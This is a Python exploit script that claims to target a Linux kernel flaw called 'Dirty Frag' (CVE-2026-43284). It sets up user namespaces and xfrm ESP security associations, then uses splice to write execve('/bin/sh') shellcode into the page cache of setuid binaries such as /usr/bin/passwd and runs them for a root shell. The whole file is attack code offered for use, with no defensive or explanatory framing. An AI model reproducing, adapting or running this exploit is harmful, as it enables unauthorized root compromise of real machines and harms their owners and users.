#!/usr/bin/env python3
"""
Dirty Frag — Linux Kernel LPE (xfrm-ESP Page-Cache Write)
Enhanced with offset brute forcing and real-time verification
"""

import os, sys, struct, socket, fcntl, pty, signal, termios, tty, select, time
import ctypes, ctypes.util
from struct import pack, unpack

_libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
_loff_t_p = ctypes.POINTER(ctypes.c_longlong)

def _raw_splice(fd_in, off_in, fd_out, off_out, length, flags):
    _libc.splice.restype = ctypes.c_long
    _libc.splice.argtypes = [ctypes.c_int, _loff_t_p, ctypes.c_int, _loff_t_p,
                             ctypes.c_size_t, ctypes.c_int]
    oi = ctypes.c_longlong(off_in) if off_in is not None else None
    oo = ctypes.c_longlong(off_out) if off_out is not None else None
    r = _libc.splice(fd_in, ctypes.byref(oi) if oi is not None else None,
                     fd_out, ctypes.byref(oo) if oo is not None else None,
                     length, flags)
    if r < 0:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return r

SYS_unshare = 272
CLONE_NEWUSER = 0x10000000
CLONE_NEWNET = 0x40000000

def _syscall(nr, *args):
    _libc.syscall.restype = ctypes.c_long
    ca = [ctypes.c_long(a) for a in args]
    _libc.syscall.argtypes = [ctypes.c_long] * (1 + len(ca))
    r = _libc.syscall(ctypes.c_long(nr), *ca)
    if r < 0:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return r

def sys_unshare(flags):
    return _syscall(SYS_unshare, flags)

AF_NETLINK=16
AF_INET=2
SOCK_DGRAM=2
IPPROTO_UDP=17
NETLINK_XFRM=6
UDP_ENCAP=100
UDP_ENCAP_ESPINUDP=2
XFRM_MSG_NEWSA=16
NLM_F_REQUEST=1
NLM_F_ACK=4
IPPROTO_ESP=50
XFRM_MODE_TRANSPORT=0
XFRM_STATE_ESN=0x80
XFRMA_ALG_AUTH_TRUNC=20
XFRMA_ALG_CRYPT=2
XFRMA_ENCAP=4
XFRMA_REPLAY_ESN_VAL=23
ENC_PORT=4500
SEQ_VAL=200
REPLAY_SEQ=100

TARGETS = ["/usr/bin/passwd", "/bin/passwd", "/usr/bin/chfn", "/usr/bin/chsh"]
PAYLOAD_LEN = 192

# Simple shellcode that just runs /bin/sh
SHELLCODE = bytearray([
    0x31, 0xc0, 0x48, 0x8d, 0x3d, 0x0e, 0x00, 0x00, 0x00,  # lea rdi, [rip+0xe]
    0x48, 0x89, 0xc6,                                         # mov rsi, rax
    0x48, 0x89, 0xc2,                                         # mov rdx, rax
    0xb0, 0x3b,                                               # mov al, 0x3b
    0x0f, 0x05,                                               # syscall
    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00           # "/bin/sh"
])
SHELLCODE = SHELLCODE + b'\x90' * (PAYLOAD_LEN - len(SHELLCODE))

VERBOSE = True  # Force verbose for debugging

def LOG(fmt, *a): print("\033[92m[+]\033[0m " + fmt % a)
def WARN(fmt, *a): print("\033[93m[!]\033[0m " + fmt % a)
def DBG(fmt, *a):
    if VERBOSE: print("\033[94m[.]\033[0m " + fmt % a)

def read_binary_data(binary_path, offset, length):
    """Read data from binary directly"""
    try:
        with open(binary_path, 'rb') as f:
            f.seek(offset)
            return f.read(length)
    except Exception as e:
        DBG("Read failed: %s", e)
        return None

def try_offset(binary_path, offset):
    """Test if offset is writable by checking current content"""
    data = read_binary_data(binary_path, offset, 8)
    if data:
        DBG("Current data at 0x%x: %s", offset, data.hex())
        # Check if it's in a writable region (not all zeros or executable code)
        if data != b'\x00'*8 and data[0] not in (0x7f, 0x00):
            return True
    return False

def _ifup_lo():
    try:
        s = socket.socket(AF_INET, SOCK_DGRAM, 0)
        import array
        ifr = array.array('B', b'\x00' * 40)
        ifr[:2] = array.array('B', b'lo')
        fcntl.ioctl(s.fileno(), 0x8913, ifr)
        flags = struct.unpack_from('<H', ifr, 16)[0]
        struct.pack_into('<H', ifr, 16, flags | 0x41)
        fcntl.ioctl(s.fileno(), 0x8914, ifr)
        s.close()
        return True
    except Exception as e:
        DBG("ifup_lo failed: %s", e)
        return False

def _setup_userns():
    uid, gid = os.getuid(), os.getgid()
    try:
        sys_unshare(CLONE_NEWUSER | CLONE_NEWNET)
        DBG("User namespace created")
    except OSError as e:
        WARN("unshare failed: %s", e)
        return False
    
    try:
        with open("/proc/self/setgroups", 'w') as f: 
            f.write("deny")
        with open("/proc/self/uid_map", 'w') as f: 
            f.write(f"0 {uid} 1")
        with open("/proc/self/gid_map", 'w') as f: 
            f.write(f"0 {gid} 1")
        DBG("Maps configured (uid:%d -> 0, gid:%d -> 0)", uid, gid)
        return _ifup_lo()
    except Exception as e:
        WARN("namespace setup failed: %s", e)
        return False

def _nl_attr(buf, off, atype, data):
    dl = len(data)
    rta_len = 4 + dl
    rta_aligned = (rta_len + 3) & ~3
    struct.pack_into('<HH', buf, off, rta_len, atype)
    buf[off+4:off+4+dl] = data
    pad = rta_aligned - 4 - dl
    if pad > 0:
        buf[off+4+dl:off+4+dl+pad] = b'\x00' * pad
    return off + rta_aligned

def _add_xfrm_sa(spi, seqhi):
    try:
        sk = socket.socket(AF_NETLINK, socket.SOCK_RAW, NETLINK_XFRM)
        sk.bind((0, 0))
        buf = bytearray(4096)
        lo = struct.unpack("<I", socket.inet_aton("127.0.0.1"))[0]
        xs_sz = 224
        struct.pack_into('<IHHII', buf, 0, 16 + xs_sz, XFRM_MSG_NEWSA,
                         NLM_F_REQUEST | NLM_F_ACK | 0x200, os.getpid(), 1)
        o = 16
        struct.pack_into('<I', buf, o + 0, lo)
        struct.pack_into('<I', buf, o + 16, lo)
        struct.pack_into('<H', buf, o + 40, AF_INET)
        buf[o + 42] = 32
        buf[o + 43] = 32
        struct.pack_into('<I', buf, o + 56, lo)
        struct.pack_into('>I', buf, o + 72, spi)
        buf[o + 76] = IPPROTO_ESP
        struct.pack_into('<I', buf, o + 80, lo)
        struct.pack_into('<Q', buf, o + 96, 0xFFFFFFFFFFFFFFFF)
        struct.pack_into('<Q', buf, o + 104, 0xFFFFFFFFFFFFFFFF)
        struct.pack_into('<Q', buf, o + 112, 0xFFFFFFFFFFFFFFFF)
        struct.pack_into('<Q', buf, o + 120, 0xFFFFFFFFFFFFFFFF)
        struct.pack_into('<I', buf, o + 208, 0x1234)
        struct.pack_into('<H', buf, o + 212, AF_INET)
        buf[o + 214] = XFRM_MODE_TRANSPORT
        buf[o + 215] = 0
        buf[o + 216] = XFRM_STATE_ESN

        a = 16 + xs_sz
        aa = bytearray(72 + 32)
        n = b"hmac(sha256)\0"
        aa[:len(n)] = n
        struct.pack_into('<I', aa, 64, 256)
        struct.pack_into('<I', aa, 68, 128)
        for i in range(32): aa[72+i] = 0xAA
        a = _nl_attr(buf, a, XFRMA_ALG_AUTH_TRUNC, bytes(aa))

        ea = bytearray(68 + 16)
        n2 = b"cbc(aes)\0"
        ea[:len(n2)] = n2
        struct.pack_into('<I', ea, 64, 128)
        for i in range(16): ea[68+i] = 0xBB
        a = _nl_attr(buf, a, XFRMA_ALG_CRYPT, bytes(ea))

        enc = bytearray(24)
        struct.pack_into('<H', enc, 0, UDP_ENCAP_ESPINUDP)
        struct.pack_into('>HH', enc, 2, ENC_PORT, ENC_PORT)
        a = _nl_attr(buf, a, XFRMA_ENCAP, bytes(enc))

        esn = bytearray(28)
        struct.pack_into('<IIIIIII', esn, 0, 1, 0, REPLAY_SEQ, 0, seqhi, 32, 0)
        a = _nl_attr(buf, a, XFRMA_REPLAY_ESN_VAL, bytes(esn))

        struct.pack_into('<I', buf, 0, a)
        sk.sendall(bytes(buf[:a]))
        
        # Wait for response
        sk.settimeout(1)
        try:
            resp = sk.recv(4096)
            if len(resp) >= 20 and struct.unpack_from('<H', resp, 4)[0] == 2:
                err = struct.unpack_from('<i', resp, 16)[0]
                if err != 0:
                    DBG("xfrm NEWSA error: %d", -err)
                    sk.close()
                    return False
        except socket.timeout:
            DBG("xfrm NEWSA timeout for spi=0x%x", spi)
        sk.close()
        return True
    except Exception as e:
        DBG("add_xfrm_sa failed: %s", e)
        return False

def _do_write(path, offset, spi):
    try:
        sk_r = socket.socket(AF_INET, SOCK_DGRAM, 0)
        sk_r.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sk_r.bind(("127.0.0.1", ENC_PORT))
        sk_r.setsockopt(IPPROTO_UDP, UDP_ENCAP, struct.pack('<I', UDP_ENCAP_ESPINUDP))
        
        sk_s = socket.socket(AF_INET, SOCK_DGRAM, 0)
        sk_s.connect(("127.0.0.1", ENC_PORT))
        
        fd = os.open(path, os.O_RDONLY)
        r, w = os.pipe()
        
        # Trigger the vulnerability
        hdr = struct.pack('>II', spi, SEQ_VAL) + b'\xCC' * 16
        os.write(w, hdr)
        
        # The critical splice operation
        try:
            _raw_splice(fd, offset, w, None, 16, 1)  # SPLICE_F_MOVE = 1
        except OSError:
            _raw_splice(fd, offset, w, None, 16, 0)
        
        # Send out
        try:
            _raw_splice(r, None, sk_s.fileno(), None, 40, 0)
        except OSError:
            pass
        
        # Give kernel time to process
        time.sleep(0.02)
        
        os.close(fd)
        os.close(r)
        os.close(w)
        sk_s.close()
        sk_r.close()
        return True
    except Exception as e:
        DBG("_do_write failed: %s", e)
        return False

def attempt_exploit(target, offset):
    """Single exploit attempt at specific offset"""
    DBG("Attempting exploit at offset 0x%x", offset)
    
    if not _setup_userns():
        return False
    
    # Setup XFRM states
    for i in range(PAYLOAD_LEN // 4):
        spi = 0xDEADBEE0 + i
        idx = i * 4
        sq = struct.unpack('>I', SHELLCODE[idx:idx+4])[0]
        if not _add_xfrm_sa(spi, sq):
            DBG("Failed to add SA for chunk %d", i)
            return False
    
    time.sleep(0.1)
    
    # Perform writes
    success = 0
    for i in range(PAYLOAD_LEN // 4):
        if _do_write(target, offset + i * 4, 0xDEADBEE0 + i):
            success += 1
        
        # Check progress periodically
        if i % 16 == 0 and i > 0:
            # Verify intermediate state
            check = read_binary_data(target, offset, 8)
            if check and check[:4] == SHELLCODE[:4]:
                DBG("Partial write detected! offset 0x%x", offset)
    
    DBG("Wrote %d/%d chunks", success, PAYLOAD_LEN // 4)
    
    # Force sync
    time.sleep(0.2)
    try:
        with open(target, 'rb') as f:
            f.read(4096)  # Force page cache refresh
    except:
        pass
    
    return True

def main():
    if os.getuid() == 0:
        LOG("Already root, spawning shell...")
        os.execvp("/bin/bash", ["bash"])
    
    LOG("Dirty Frag LPE Exploit (CVE-2026-43284)")
    LOG("Target kernel: %s", os.uname().release)
    
    # Check if vulnerable
    try:
        sock = socket.socket(AF_NETLINK, socket.SOCK_RAW, NETLINK_XFRM)
        sock.close()
        LOG("XFRM netlink available")
    except:
        WARN("XFRM netlink not available")
        sys.exit(1)
    
    # Find target
    target = None
    for t in TARGETS:
        if os.path.exists(t) and os.access(t, os.R_OK):
            target = t
            LOG("Target binary: %s", target)
            break
    
    if not target:
        WARN("No suitable target found")
        sys.exit(1)
    
    # Try multiple offsets
    offsets = [0x14d0, 0x1500, 0x1600, 0x1700, 0x1800, 0x1900, 0x1a00, 
               0x1b00, 0x1c00, 0x1d00, 0x1e00, 0x2000, 0x2500, 0x3000, 0x363c]
    
    LOG("Trying %d different offsets...", len(offsets))
    
    for offset in offsets:
        # Check if binary is large enough
        binary_size = os.path.getsize(target)
        if offset + PAYLOAD_LEN > binary_size:
            DBG("Offset 0x%x out of bounds (size=0x%x)", offset, binary_size)
            continue
        
        LOG("Trying offset 0x%x", offset)
        
        # Backup original bytes at offset
        original = read_binary_data(target, offset, 8)
        DBG("Original bytes at 0x%x: %s", offset, original.hex() if original else "None")
        
        if attempt_exploit(target, offset):
            # Verify
            time.sleep(0.3)
            current = read_binary_data(target, offset, len(SHELLCODE[:8]))
            
            if current and current == SHELLCODE[:8]:
                LOG("SUCCESS! Binary patched at offset 0x%x", offset)
                LOG("Spawning root shell...")
                
                # Launch shell
                os.execvp(target, [target])
                return
        
        WARN("Offset 0x%x failed, trying next...", offset)
        time.sleep(0.5)
    
    WARN("All offsets failed - kernel is likely patched")
    WARN("Note: CVE-2026-43284 may have been backported to your kernel")
    
    # Additional check
    LOG("Checking kernel module versions...")
    os.system("modinfo esp4 2>/dev/null | grep -E 'version|vermagic'")

if __name__ == "__main__":
    main()
